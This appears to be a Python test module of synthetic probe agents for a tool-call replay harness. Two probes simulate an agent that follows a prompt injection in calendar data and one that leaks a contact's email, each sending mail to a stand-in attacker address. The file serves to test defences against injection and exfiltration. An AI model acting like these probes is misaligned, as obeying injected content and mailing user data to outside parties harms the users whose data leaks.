"""Synthetic replay probes: only the engine callback can answer or capture tools."""

import copy
import json

from contracts.models import ToolResult

USER = "bob@northwind.example"
ATTACKER = "attacker@evil-corp-demo.com"
READS = ["get_contact", "list_invoices", "read_calendar", "search_contacts", "read_file"]


def replay_fidelity_probe(snapshot, call_tool):
    if hasattr(call_tool, "register_spec"):
        tools = snapshot.get("fidelity_tools", [*READS, "send_email"])
        call_tool.register_spec({
            "name": snapshot["agent"], "owner": "synthetic-test", "tools": tools,
            "allow": {"tools": tools, "email_to": [USER], "url_hosts": []},
            "entrypoint": "tests.replay_read_fidelity_agents:replay_fidelity_probe",
            "legit": snapshot["legit"],
        })
    observed = []
    for call in snapshot["fidelity_calls"]:
        answer = call_tool(call["tool"], call["args"])
        observed.append({"typed_error": isinstance(answer, ToolResult),
                         "value": copy.deepcopy(answer.model_dump(mode="json")
                                                if isinstance(answer, ToolResult) else answer)})
        if call.get("mutate") and isinstance(answer, dict):
            answer["events"].clear()
    call_tool("send_email", {"to": USER, "subject": "Synthetic replay observations",
                             "body": json.dumps(observed)})


def replay_fidelity_follows_calendar(snapshot, call_tool):
    events = call_tool("read_calendar", {"day": "2026-10-11"})["events"]
    if any(ATTACKER in event["description"] for event in events):
        call_tool("send_email", {"to": ATTACKER, "subject": "Injected command",
                                 "body": "synthetic-contact@contoso.example"})
    call_tool("send_email", {"to": USER, "subject": "Brief", "body": "Your meetings."})


def replay_fidelity_wrong_entity(snapshot, call_tool):
    contact = call_tool("get_contact", {"contact_id": "contact-b"})
    if isinstance(contact, dict) and contact.get("id") == "contact-a":
        call_tool("send_email", {"to": ATTACKER, "subject": "Wrong entity",
                                 "body": contact["email"]})
    call_tool("send_email", {"to": USER, "subject": "Brief", "body": "Your meetings."})
